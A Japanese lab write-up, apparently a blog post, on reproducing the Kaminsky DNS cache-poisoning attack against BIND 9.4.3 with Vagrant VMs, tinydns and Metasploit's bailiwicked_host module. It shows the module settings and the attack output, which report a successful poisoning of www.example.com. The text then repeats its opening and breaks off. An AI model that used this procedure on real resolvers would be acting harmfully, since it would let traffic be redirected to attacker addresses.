{"context": "\u4eca\u66f4\u306a\u304c\u3089\u3001\u81ea\u5206\u3067\u8a66\u3057\u305f\u3053\u3068\u304c\u306a\u304b\u3063\u305f\u306e\u3067\u8a66\u3057\u3066\u307f\u307e\u3057\u305f\u3002\n\u7279\u306b\u653b\u6483\u306e\u6982\u8981\u306a\u3069\u306f\u8aac\u660e\u305b\u305a\u3001\u305f\u3060\u5b9f\u9a13\u3057\u3066\u307f\u305f\u3068\u3044\u3046\u5185\u5bb9\u3067\u3059\u3002\n\n\u6982\u8981\nKaminsky Attack\u3068\u306f\u30012008\u5e747\u6708\u306bBlackHat USA\u3067\u30c0\u30f3\u30fb\u30ab\u30df\u30f3\u30b9\u30ad\u30fc\uff08Dan Kaminsky\uff09\u6c0f\u304c\u767a\u8868\u3057\u305fDNS\u30ad\u30e3\u30c3\u30b7\u30e5\u30dd\u30a4\u30ba\u30cb\u30f3\u30b0\u306e\u65b0\u305f\u306a\u653b\u6483\u65b9\u6cd5\u3067\u3059\u3002\u8a73\u7d30\u306f\u53c2\u8003\u30da\u30fc\u30b8\u3092\u3054\u89a7\u304f\u3060\u3055\u3044\u3002\n\u3053\u306e\u653b\u6483\u65b9\u6cd5\u304c\u767a\u898b\u3055\u308c\u305f\u306e\u306f\u304b\u306a\u308a\u6614\u3067\u306f\u3042\u308a\u307e\u3059\u304c\u3001\u5b9f\u969b\u306b\u81ea\u5206\u3067\u6bd2\u3092\u5165\u308c\u3066\u307f\u306a\u3044\u3068\u7406\u89e3\u304c\u6d45\u3044\u304b\u306a\u3068\u3044\u3046\u3053\u3068\u3067\u8a66\u3057\u3066\u307f\u307e\u3057\u305f\u3002\nKaminsky Attack\u306f\u77e5\u3063\u3066\u3044\u308b\u3082\u306e\u3068\u3057\u3066\u3001\u5b9f\u9a13\u306e\u65b9\u6cd5\u3060\u3051\u66f8\u3044\u3066\u304a\u304d\u307e\u3059\u3002\n\n\u53c2\u8003\n\nhttps://www.nic.ad.jp/ja/materials/iw/2008/proceedings/H3/IW2008-H3-07.pdf\nhttps://www.nic.ad.jp/ja/newsletter/No40/0800.html\nhttp://www.e-ontap.com/dns/bindmatrix.html\n\n\n\u74b0\u5883\n\u74b0\u5883\u3068\u3057\u3066\u306f\u3001\u307b\u307c\u53c2\u8003\u30da\u30fc\u30b8\u901a\u308a\u306b\u3084\u308a\u307e\u3057\u305f\u3002\n\u5168\u3066Vagrant\u3067VM\u3092\u4f5c\u6210\u3057\u307e\u3057\u305f\uff08\u5168\u90e8Docker\u3067\u3084\u308c\u3070\u826f\u304b\u3063\u305f\u306a\u3001\u3068\u5f8c\u3067\u601d\u3044\u307e\u3057\u305f\uff09\u3002\n\n\u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\uff08BIND\uff09\n\n\n192.168.33.10\n\n\n\u30eb\u30fc\u30c8\u30b5\u30fc\u30d0 \u517c example.nom\u6a29\u5a01\u30b5\u30fc\u30d0\uff08tinydns\uff09\n\n\n192.168.33.11\n\n\n\u653b\u6483\u8005\u30b5\u30fc\u30d0\uff08Metasploit Framework)\n\n\n192.168.33.12\n\n\n\n\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u611f\u3058\u3067\u3059\u3002\n\n\n\u5b9f\u9a13\n\n\u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\uff08BIND\uff09\n\u53c2\u8003\u30da\u30fc\u30b8\u306b\u3088\u308b\u3068\u3001Kaminsky Attack\u306fDNS\u81ea\u4f53\u306e\u8106\u5f31\u6027\u3067\u306f\u306a\u304f\u5b9f\u88c5\u306e\u554f\u984c\u3068\u3044\u3046\u3053\u3068\u306e\u3088\u3046\u3067\u3059\u3002\nBIND\u306e\u7279\u5b9a\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u306b\u306f\u6bd2\u3092\u5165\u308c\u308b\u3053\u3068\u304c\u51fa\u6765\u308b\u3088\u3046\u306a\u306e\u3067\u3001\u4eca\u56de\u306f9.4.3\u3092\u4f7f\u3063\u3066\u307f\u307e\u3059\u3002\n\u88ab\u653b\u6483\u30b5\u30fc\u30d0\u3067\u306fBIND\u3092\u52d5\u304b\u3057\u3001\u30ad\u30e3\u30c3\u30b7\u30e5DNS\u30b5\u30fc\u30d0\u3068\u3057\u3066\u52d5\u4f5c\u3055\u305b\u307e\u3059\u3002\n\nVM\u306e\u7528\u610f\nVagrant\u3067192.168.33.10\u3092\u6307\u5b9a\u3057\u3066\u8d77\u52d5\u3057\u307e\u3059\u3002\n\u4eca\u56de\u306f\u4e88\u3081\u7528\u610f\u3057\u3066\u304a\u3044\u305fCentOS 6.8\u306ebox\u30a4\u30e1\u30fc\u30b8\u3092\u5229\u7528\u3057\u307e\u3057\u305f\u3002\n$ vagrant init centos68\n$ vim Vagrantfile\nconfig.vm.network \"private_network\", ip: \"192.168.33.10\"\n$ vagrant up\n$ vagrant ssh\n\n\u3053\u308c\u3067VM\u306e\u7528\u610f\u306f\u5b8c\u4e86\u3067\u3059\u3002\n\nDocker\u306e\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\n\u74b0\u5883\u3092Docker\u3067\u4f5c\u3063\u305f\u307b\u3046\u304c\u5f8c\u3067\u697d\u3060\u3068\u601d\u3063\u305f\u306e\u3067Docker\u3067\u4f5c\u6210\u3057\u307e\u3057\u305f\u3002\n\u307e\u305a\u6700\u521d\u306bDocker\u3092\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u307e\u3059\u3002\n\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u624b\u9806\u306f\u4ee5\u4e0b\u306a\u3069\u3092\u53c2\u8003\u306b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\nhttp://qiita.com/zwirky/items/991f61a231f4e198a320\n\nDocker\u30b3\u30f3\u30c6\u30ca\u306e\u8d77\u52d5\n\u4ed6\u306e\u74b0\u5883\u3067\u3082\u5b9f\u9a13\u3057\u3084\u3059\u3044\u3088\u3046\u306b\u3001Docker\u30a4\u30e1\u30fc\u30b8\u3092\u4f5c\u308a\u307e\u3057\u305f\u3002\n\u4ee5\u4e0b\u306e\u30b3\u30de\u30f3\u30c9\u3067\u8d77\u52d5\u3057\u307e\u3059\u3002\n# docker run -d -p 53:53/udp knqyf263/docker-kaminsky\n\n\u3053\u308c\u3067\u6e96\u5099\u306f\u5b8c\u4e86\u3067\u3059\u304c\u3001\u5177\u4f53\u7684\u306b\u4f55\u3092\u3057\u305f\u304b\u3082\u8aac\u660e\u3057\u3066\u304a\u304d\u307e\u3059\u3002\n\u57fa\u672c\u7684\u306b\u306f\u666e\u901a\u306eBIND\u306e\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u624b\u9806\u901a\u308a\u3067\u3059\u3002\n\u81ea\u5206\u3067\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u305f\u3044\u4eba\u306f\u4ee5\u4e0b\u306a\u3069\u3092\u53c2\u8003\u306b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\nhttp://qiita.com/na0AaooQ/items/9ed548dd6db2a0c911c4\nDockerfile\u3092\u898b\u308c\u3070\u96f0\u56f2\u6c17\u306f\u3064\u304b\u3081\u308b\u3068\u601d\u3044\u307e\u3059\u3002\nhttps://github.com/knqyf263/docker-kaminsky/blob/master/Dockerfile\n\n\u30bd\u30fc\u30b9\u30dd\u30fc\u30c8\u306e\u56fa\u5b9a\nKaminsky Attack\u3067\u306f\u6bd2\u3092\u5165\u308c\u308b\u969b\u306b\u554f\u3044\u5408\u308f\u305b\u6642\u306e\u30dd\u30fc\u30c8\u3092\u4e88\u60f3\u3059\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\n\u30e9\u30f3\u30c0\u30e0\u3060\u3068\u8a66\u884c\u56de\u6570\u304c\u591a\u304f\u306a\u3063\u3066\u3057\u307e\u3046\u305f\u3081\u3001\u7c21\u5358\u306e\u305f\u3081\u56fa\u5b9a\u3057\u3066\u304a\u304d\u307e\u3059\u3002\n\u56fa\u5b9a\u3057\u306a\u304f\u3066\u3082\u53ef\u80fd\u306a\u306f\u305a\u3067\u3059\u3002\n\u4ee5\u4e0b\u3067\u306f10000\u756a\u306b\u56fa\u5b9a\u3057\u3066\u3044\u307e\u3059\u3002\n$ vim /etc/named.conf\n...\nquery-source address * port 10000;\n\n\nhint\u30d5\u30a1\u30a4\u30eb\u306e\u66f4\u65b0\n\u30eb\u30fc\u30c8DNS\u30b5\u30fc\u30d0\u3068\u3057\u3066\u81ea\u5206\u306e\u5efa\u3066\u305f\u30b5\u30fc\u30d0\u3092\u898b\u306b\u884c\u3063\u3066\u307b\u3057\u304b\u3063\u305f\u306e\u3067\u3001hint\u30d5\u30a1\u30a4\u30eb\u3092\u66f4\u65b0\u3057\u307e\u3059\u3002\n\u4eca\u56de\u3067\u306f192.168.33.11\u306b\u5411\u3051\u307e\u3059\u3002\n$ vim /etc/cache.db\n.                        3600000      NS    A.ROOT-SERVERS.NET.\nA.ROOT-SERVERS.NET.      3600000      A     192.168.33.11\n\n\u3053\u3046\u3059\u308b\u3053\u3068\u3067\u4f55\u306e\u30c9\u30e1\u30a4\u30f3\u540d\u3092\u554f\u3044\u5408\u308f\u305b\u3066\u3082\u3001\u307e\u305a\u306f192.168.33.11\u306b\u554f\u3044\u5408\u308f\u305b\u308b\u3088\u3046\u306b\u306a\u308b\u306f\u305a\u3067\u3059\u3002\n\u305d\u3057\u3066named.conf\u306b\u3053\u306ehint\u30d5\u30a1\u30a4\u30eb\u3092\u6307\u5b9a\u3057\u3066\u304a\u304d\u307e\u3059\u3002\n$ vim /etc/named.conf\n...\uff08\u7565\uff09...\nzone \".\" {\n        type hint;\n        file \"/etc/cache.db\";\n};\n\n\n\n\u30eb\u30fc\u30c8\u30b5\u30fc\u30d0 \u517c example.nom\u6a29\u5a01\u30b5\u30fc\u30d0\uff08tinydns\uff09\n\u6a29\u5a01DNS\u30b5\u30fc\u30d0\u306e\u8a2d\u5b9a\u3092\u3057\u307e\u3059\u3002\n\u3053\u3061\u3089\u306ftinydns\u3092\u5229\u7528\u3057\u307e\u3057\u305f\u304c\u3001tinydns\u306eDocker\u304c\u3042\u3063\u305f\u306e\u3067\u305d\u308c\u3092\u4f7f\u3044\u307e\u3057\u305f\u3002\nzone\u3068\u3057\u3066.\u3068example.com.\u3092\u7ba1\u7406\u3059\u308b\u3053\u3068\u306b\u3057\u307e\u3059\u3002\n\u30eb\u30fc\u30c8DNS\u30b5\u30fc\u30d0\u3068example.com\u6a29\u5a01DNS\u30b5\u30fc\u30d0\u306f\u5206\u3051\u3066\u3082\u826f\u304b\u3063\u305f\u306e\u3067\u3059\u304c\u3001\u4e00\u7dd2\u3067\u3082\u5b9f\u9a13\u306f\u53ef\u80fd\u304b\u3068\u601d\u3063\u305f\u306e\u3067\u4e00\u7dd2\u306b\u3057\u307e\u3057\u305f\u3002\n\nVM\u306e\u7528\u610f\nIP\u30a2\u30c9\u30ec\u30b9\u4ee5\u5916\u306f\u4e0a\u3068\u540c\u3058\u3067\u3059\u3002\nVagrant\u3067192.168.33.11\u3092\u6307\u5b9a\u3057\u3066\u8d77\u52d5\u3057\u307e\u3059\u3002\nwww.example.com\u306f192.168.33.100\u306a\u3069\u9069\u5f53\u306aIP\u30a2\u30c9\u30ec\u30b9\u3092\u6307\u5b9a\u3057\u307e\u3057\u305f\u3002\n$ vagrant init centos68\n$ vim Vagrantfile\nconfig.vm.network \"private_network\", ip: \"192.168.33.11\"\n$ vagrant up\n$ vagrant ssh\n\n\nDocker\u306e\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\n\u4e0a\u3068\u540c\u69d8\u306b\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u307e\u3059\u3002\n\nDocker\u30b3\u30f3\u30c6\u30ca\u306e\u8d77\u52d5\n\u4ee5\u4e0b\u306e\u30a4\u30e1\u30fc\u30b8\u3092\u5229\u7528\u3055\u305b\u3066\u3044\u305f\u3060\u304d\u307e\u3057\u305f\u3002\nhttps://github.com/skurtzemann/docker-tinydns\ntinydns.data\u30d5\u30a1\u30a4\u30eb\u3092\u4f5c\u6210\u3057\u3066\u30b3\u30f3\u30c6\u30ca\u8d77\u52d5\u6642\u306b\u30de\u30a6\u30f3\u30c8\u3059\u308c\u3070\u826f\u3044\u3088\u3046\u3067\u3059\u3002\nns\u3068\u3057\u3066\u81ea\u5206\u3092\u6307\u5b9a\u3057\u305f\u304b\u3063\u305f\u306e\u3067192.168.33.11\u306b\u3057\u307e\u3059\u3002\n$ vim tinydns.data\n.:192.168.33.11:ns.toor.tss:518400\n.example.com:192.168.33.11:ns.example.com:3600\n+www.example.com:192.168.33.100\n\n\u305d\u3057\u3066\u3053\u306e\u30d5\u30a1\u30a4\u30eb\u304c\u3042\u308b\u4f4d\u7f6e\u3067\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u30b3\u30de\u30f3\u30c9\u3092\u6253\u3061\u307e\u3059\u3002\n$ docker run -d -v `pwd`:/data -p 53:53/udp skurtzemann/tinydns\n\n\u3053\u308c\u3067tinydns\u81ea\u4f53\u306f\u8d77\u52d5\u5b8c\u4e86\u3067\u3059\u3002\n\n\u30c6\u30b9\u30c8\n\u6b63\u3057\u304fexample.com\u306eNS\u30ec\u30b3\u30fc\u30c9\u304c\u5f15\u3051\u308b\u304b\u78ba\u8a8d\u3057\u3066\u307f\u307e\u3059\u3002\n[root@localhost vagrant]# dig @127.0.0.1 ns example.com\n\n; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.3 <<>> @127.0.0.1 ns example.com\n; (1 server found)\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 63977\n;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n;; WARNING: recursion requested but not available\n\n;; QUESTION SECTION:\n;example.com.                   IN      NS\n\n;; ANSWER SECTION:\nexample.com.            3600    IN      NS      ns.example.com.\n\n;; ADDITIONAL SECTION:\nns.example.com.         3600    IN      A       192.168.33.11\n\n;; Query time: 1 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1)\n;; WHEN: Sun Dec 25 11:15:46 2016\n;; MSG SIZE  rcvd: 62\n\n192.168.33.11\u304c\u8fd4\u3063\u3066\u6765\u3066\u3044\u308b\u306e\u3067\u554f\u984c\u306a\u3055\u305d\u3046\u3067\u3059\u3002\n\u307e\u305f\u3001\u4eca\u56de\u306e\u653b\u6483\u5bfe\u8c61\u3067\u3042\u308bBIND\u30b5\u30fc\u30d0\u306b\u5bfe\u3057\u3066\u3082\u554f\u3044\u5408\u308f\u305b\u3066\u307f\u307e\u3059\u3002\n[root@localhost vagrant]# dig @192.168.33.10 ns example.com +short\nns.example.com.\n\n\u6b63\u3057\u304f\u8a2d\u5b9a\u3067\u304d\u3066\u3044\u308b\u3088\u3046\u3067\u3059\uff08\u672c\u6765\u306a\u3089 a.iana-servers.net. \u306a\u3069\u304c\u8fd4\u3055\u308c\u308b\uff09\u3002\n\u3053\u308c\u3067DNS\u30b5\u30fc\u30d0\u306e\u6e96\u5099\u306f\u5b8c\u4e86\u3067\u3059\u3002\n\n\u9045\u5ef6\u306e\u8a2d\u5b9a\n\u6a29\u5a01DNS\u30b5\u30fc\u30d0\u304b\u3089\u306e\u30ec\u30b9\u30dd\u30f3\u30b9\u304c\u9045\u3044\u307b\u3046\u304c\u653b\u6483\u304c\u6210\u529f\u3057\u3084\u3059\u3044\u306e\u3067\u3001\u9045\u5ef6\u3092\u5165\u308c\u307e\u3059\u3002\nLinux\u306a\u306e\u3067tc\u30b3\u30de\u30f3\u30c9\u3092\u5229\u7528\u3057\u307e\u3059\u3002\n$ sudo tc qdisc add dev eth1 root netem delay 200ms\n\n\u4e0a\u8a18\u3067\u306f200ms\u306e\u9045\u5ef6\u3092\u5165\u308c\u307e\u3057\u305f\u3002\nVagrant\u3067\u8d77\u52d5\u3057\u305f\u3089eth1\u304c192.168.33.11\u306b\u5272\u5f53\u305f\u3063\u3066\u3044\u305f\u306e\u3067eth1\u3092\u6307\u5b9a\u3057\u307e\u3059\u3002\n\u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\u304b\u3089ping\u3092\u6253\u3063\u3066\u307f\u307e\u3059\u3002\n[root@localhost ~]# ping -c 3 192.168.33.11\nPING 192.168.33.11 (192.168.33.11) 56(84) bytes of data.\n64 bytes from 192.168.33.11: icmp_seq=1 ttl=64 time=202 ms\n64 bytes from 192.168.33.11: icmp_seq=2 ttl=64 time=202 ms\n64 bytes from 192.168.33.11: icmp_seq=3 ttl=64 time=201 ms\n\n--- 192.168.33.11 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2204ms\nrtt min/avg/max/mdev = 201.991/202.143/202.381/0.170 ms\n\n\u6b63\u3057\u304f200ms\u306e\u9045\u5ef6\u304c\u767a\u751f\u3057\u3066\u3044\u307e\u3059\u3002\n\n\u653b\u6483\u8005\u30b5\u30fc\u30d0\uff08Metasploit Framework)\n\u6700\u5f8c\u306b\u653b\u6483\u8005\u30b5\u30fc\u30d0\u3092\u7528\u610f\u3057\u307e\u3059\u3002\nMetasploit Framework\uff08\u4ee5\u4e0bMetasploit\uff09\u304c\u5229\u7528\u3057\u305f\u304b\u3063\u305f\u306e\u3067\u3001Kali Linux\u3092\u5229\u7528\u3057\u307e\u3057\u305f\u3002\n\nVM\u306e\u7528\u610f\n\u4e8b\u524d\u306b\u7528\u610f\u3057\u3066\u304a\u3044\u305fKali Linux\u306ebox\u30a4\u30e1\u30fc\u30b8\u3092\u5229\u7528\u3057\u307e\u3059\u3002\n$ vagrant init kali\n$ vim Vagrantfile\nconfig.vm.network \"private_network\", ip: \"192.168.33.12\"\n$ vagrant up\n$ vagrant ssh\n\n\n\u653b\u6483\u3059\u308b\nmsfconsole\u3092\u8d77\u52d5\u3057\u305f\u3042\u3068\u3001bailiwicked_host\u30e2\u30b8\u30e5\u30fc\u30eb\u3092\u5229\u7528\u3057\u307e\u3059\u3002\n$ sudo msfconsole\nmsf > use auxiliary/spoof/dns/bailiwicked_host\nmsf auxiliary(bailiwicked_host) >\n\n\u30aa\u30d7\u30b7\u30e7\u30f3\u306f\u4ee5\u4e0b\u3067\u3059\u3002\nmsf auxiliary(bailiwicked_host) > show options\n\nModule options (auxiliary/spoof/dns/bailiwicked_host):\n\n   Name       Current Setting    Required  Description\n   ----       ---------------    --------  -----------\n   HOSTNAME   pwned.example.com  yes       Hostname to hijack\n   INTERFACE                     no        The name of the interface\n   NEWADDR    1.3.3.7            yes       New address for hostname\n   RECONS     208.67.222.222     yes       The nameserver used for reconnaissance\n   RHOST                         yes       The target address\n   SNAPLEN    65535              yes       The number of bytes to capture\n   SRCADDR    Real               yes       The source address to use for sending the queries (Accepted: Real, Random)\n   SRCPORT                       yes       The target server's source query port (0 for automatic)\n   TIMEOUT    500                yes       The number of seconds to wait for new data\n   TTL        39223              yes       The TTL for the malicious host entry\n   XIDS       0                  yes       The number of XIDs to try for each query (0 for automatic)\n\n\u4eca\u56de\u306e\u653b\u6483\u5bfe\u8c61\u306f192.168.33.10\u306a\u306e\u3067RHOST\u306b\u6307\u5b9a\u3057\u307e\u3059\u3002\nmsf auxiliary(bailiwicked_host) > set RHOST 192.168.33.10\nRHOST => 192.168.33.10\n\n\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\u306e\u30bd\u30fc\u30b9\u30dd\u30fc\u30c8\u306f10000\u756a\u306b\u56fa\u5b9a\u3057\u305f\u306e\u3067\u3001SRCPORT\u306b\u6307\u5b9a\u3057\u307e\u3059\u3002\n\u305f\u3060\u3057\u3001\u3053\u3053\u30671\u3064\u554f\u984c\u304c\u3042\u308a\u307e\u3059\u3002\u30bd\u30fc\u30b9\u30dd\u30fc\u30c8\u3092\u56fa\u5b9a\u3057\u305f\u306e\u306fDocker\u306e\u30b3\u30f3\u30c6\u30ca\u5185\u306e\u8a71\u3067\u3001\u30db\u30b9\u30c8\u304b\u3089\u901a\u4fe1\u304c\u51fa\u308b\u969b\u306bNAPT\u3055\u308c\u3066\u3057\u307e\u3044\u307e\u3059\u3002\n\u305d\u3053\u3067\u3001\u5148\u306b\u30dd\u30fc\u30c8\u3092\u8abf\u3079\u3066\u304a\u304d\u307e\u3059\u3002\n\u307e\u305a\u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\u3067dig\u306a\u3069\u3067\u3057\u3064\u3064\u3001\u30eb\u30fc\u30c8\u30b5\u30fc\u30d0\u3067\u4ee5\u4e0b\u306e\u3088\u3046\u306btcpdump\u3092\u3057\u3066\u304a\u304d\u307e\u3059\u3002\n[root@localhost vagrant]# tcpdump -nnni eth1\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes\n14:27:05.069187 IP 192.168.33.10.10000 > 192.168.33.11.53: 9343 [1au] NS? . (28)\n\n\u3053\u3046\u3059\u308b\u3068\u4e0a\u8a18\u306e\u3088\u3046\u306b\u3001\u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\u306e\u30bd\u30fc\u30b9\u30dd\u30fc\u30c8\u304c\u5206\u304b\u308a\u307e\u3059\u3002\n\u4eca\u56de\u306f\u5909\u63db\u3055\u308c\u305a10000\u756a\u30dd\u30fc\u30c8\u306e\u307e\u307e\u3067\u3057\u305f\u3002\n\u74b0\u5883\u306b\u3088\u3063\u3066\u306f\u7570\u306a\u308b\u30dd\u30fc\u30c8\u306a\u3069\u306b\u306a\u308b\u306e\u3067\u8abf\u3079\u3066\u307f\u3066\u304f\u3060\u3055\u3044\u3002\nmsf auxiliary(bailiwicked_host) > set SRCPORT 10000\nSRCPORT => 10000\n\n\u4eca\u56de\u306fwww.example.com\u3092\u6c5a\u67d3\u3057\u305f\u3044\u306e\u3067HOSTNAME\u306b\u6307\u5b9a\u3057\u307e\u3059\u3002\nmsf auxiliary(bailiwicked_host) > set HOSTNAME www.example.com\nHOSTNAME => www.example.com\n\nVagrant\u3067\u306f192.168.33.12\u3092eth1\u306b\u5272\u308a\u5f53\u3066\u3066\u3044\u308b\u306e\u3067\u3001INTERFACE\u306b\u306feth1\u3092\u6307\u5b9a\u3057\u307e\u3059\u3002\n\u6700\u521d\u3053\u308c\u3092\u6307\u5b9a\u3057\u3066\u3044\u306a\u304b\u3063\u305f\u305f\u3081\u3001eth0\u304b\u3089\u30d1\u30b1\u30c3\u30c8\u304c\u51fa\u3066\u3057\u307e\u3063\u3066\u3046\u307e\u304f\u884c\u304d\u307e\u305b\u3093\u3067\u3057\u305f\u3002\nmsf auxiliary(bailiwicked_host) > set INTERFACE eth1\nINTERFACE => eth1\n\n\u6b21\u306b\u3001RECONS\u3092\u6307\u5b9a\u3057\u307e\u3059\u3002\nKaminsky Attack\u3067\u306f\u30bd\u30fc\u30b9\u30a2\u30c9\u30ec\u30b9\u306e\u507d\u88c5\u3092\u884c\u3044\u307e\u3059\u304c\u3001bailiwicked_host\u30e2\u30b8\u30e5\u30fc\u30eb\u3067\u306f\u81ea\u52d5\u3067\u507d\u88c5\u3059\u308b\u3079\u304d\u30a2\u30c9\u30ec\u30b9\u3092\u63a2\u3057\u3066\u304f\u308c\u307e\u3059\u3002\n\u305d\u306e\u969b\u3001example.com\u306eNS\u30ec\u30b3\u30fc\u30c9\u3092\u5f15\u3044\u3066\u304d\u3066\u3001\u305d\u306e\u30a2\u30c9\u30ec\u30b9\u306b\u507d\u88c5\u3059\u308b\u306e\u3067\u3059\u304c\u3001\u4eca\u56de\u306f\u672c\u6765\u306e\u30a2\u30c9\u30ec\u30b9\u306b\u507d\u88c5\u3055\u308c\u308b\u3068\u4e0a\u624b\u304f\u884c\u304d\u307e\u305b\u3093\u3002\n\u305d\u3053\u3067\u3001example.com\u306eNS\u30ec\u30b3\u30fc\u30c9\u3092\u5f15\u304f\u5148\u3092192.168.33.11\u306b\u6307\u5b9a\u3057\u307e\u3059\u3002\n192.168.33.11\u306b\u554f\u3044\u5408\u308f\u305b\u308b\u3068\u3001example.com\u306eNS\u30ec\u30b3\u30fc\u30c9\u306f192.168.33.11\u304c\u8fd4\u3055\u308c\u308b\u306e\u3067\u3001192.168.33.11\u306b\u507d\u88c5\u3057\u3066\u304f\u308c\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002\n\uff08\u3068\u3044\u3046\u7406\u89e3\u3067\u3059\u304c\u3001\u3082\u3057\u9055\u3063\u3066\u305f\u3089\u3059\u307f\u307e\u305b\u3093\u3002\uff09\nmsf auxiliary(bailiwicked_host) > set RECONS 192.168.33.11\nRECONS => 192.168.33.11\n\n\u3053\u308c\u3067\u6e96\u5099\u5b8c\u4e86\u3057\u305f\u306e\u3067\u653b\u6483\u3057\u3066\u307f\u307e\u3057\u3087\u3046\u3002\nmsf auxiliary(bailiwicked_host) > run\n\n[*] Targeting nameserver 192.168.33.10 for injection of www.example.com. as 1.3.3.7\n[*] Querying recon nameserver for example.com.'s nameservers...\n[*]  Got an NS record: example.com.            3600    IN      NS      ns.example.com.\n[*]   Querying recon nameserver for address of ns.example.com....\n[*]    Got an A record: ns.example.com.         3600    IN      A       192.168.33.11\n[*]     Checking Authoritativeness: Querying 192.168.33.11 for example.com....\n[*]     ns.example.com. is authoritative for example.com., adding to list of nameservers to spoof as\n[*] Calculating the number of spoofed replies to send per query...\n[*]   race calc: 100 queries | min/max/avg time: 0.3/0.32/0.3 | min/max/avg replies: 291/651/516\n[*] Sending 774 spoofed replies from each nameserver (1) for each query\n[*] Attempting to inject a poison record for www.example.com. into 192.168.33.10:1025...\n[*] Poisoning successful after 250 queries and 193500 responses: www.example.com == 1.3.3.7\n[*] TTL: 39116 DATA: #<Resolv::DNS::Resource::IN::A:0x00000005936430>\n[*] Auxiliary module execution completed\n\n\u5c11\u3057\u5f85\u3064\u3068\u4e0a\u8a18\u306e\u3088\u3046\u306b\u653b\u6483\u304c\u6210\u529f\u3057\u305f\u3053\u3068\u304c\u5206\u304b\u308a\u307e\u3059\u3002\n\u88ab\u653b\u6483\u30b5\u30fc\u30d0\u306bwww.example.com\u3092\u554f\u3044\u5408\u308f\u305b\u308b\u30681.3.3.7\u304c\u8fd4\u3055\u308c\u307e\u3059\u3002\n[root@localhost ~]# dig @127.0.0.1 www.example.com +short\n1.3.3.7\n\n\u305f\u3060\u3057\u3001\u5834\u5408\u306b\u3088\u3063\u3066\u306f\u6642\u9593\u304c\u304b\u304b\u308b\u3053\u3068\u3082\u3042\u308a\u307e\u3059\u3002\n\n\u307e\u3068\u3081\nKaminsky Attack\u3092\u81ea\u5206\u3067\u691c\u8a3c\u3057\u3066\u307f\u307e\u3057\u305f\u3002\nBIND 9.4.3\u3067\u306fMetasploit\u306e\u30e2\u30b8\u30e5\u30fc\u30eb\u3092\u4f7f\u3063\u3066\u6bd2\u3092\u5165\u308c\u308b\u3053\u3068\u304c\u51fa\u6765\u307e\u3057\u305f\u3002\n\u5b9f\u9a13\u3067\u306f\u30bd\u30fc\u30b9\u30dd\u30fc\u30c8\u3092\u56fa\u5b9a\u3057\u305f\u306e\u3067\u7c21\u5358\u3067\u3057\u305f\u304c\u3001\u56fa\u5b9a\u3057\u306a\u3044\u3068\u5272\u3068\u6642\u9593\u304c\u304b\u304b\u308a\u307e\u3059\u3002\n\u4ed6\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u3067\u306fAdditional Section\u306eA\u30ec\u30b3\u30fc\u30c9\u3092\u53d7\u3051\u5165\u308c\u306a\u3044\u304b\u3089\u6bd2\u304c\u5165\u3089\u306a\u3044\u3068\u3044\u3046\u3053\u3068\u3089\u3057\u3044\u306e\u3067\u3001\u6b21\u306f\u5225\u30d0\u30fc\u30b8\u30e7\u30f3\u3067\u8a66\u3057\u3066\u307f\u3088\u3046\u3068\u601d\u3044\u307e\u3059\u3002\n\n\u4eca\u66f4\u306a\u304c\u3089\u3001\u81ea\u5206\u3067\u8a66\u3057\u305f\u3053\u3068\u304c\u306a\u304b\u3063\u305f\u306e\u3067\u8a66\u3057\u3066\u307f\u307e\u3057\u305f\u3002\n\u7279\u306b\u653b\u6483\u306e\u6982\u8981\u306a\u3069\u306f\u8aac\u660e\u305b\u305a\u3001\u305f\u3060\u5b9f\u9a13\u3057\u3066\u307f\u305f\u3068\u3044\u3046\u5185\u5bb9\u3067\u3059\u3002\n\n#\u6982\u8981\nKaminsky Attack\u3068\u306f\u30012008\u5e747\u6708\u306bBlackHat USA\u3067\u30c0\u30f3\u30fb\u30ab\u30df\u30f3\u30b9\u30ad\u30fc\uff08Dan 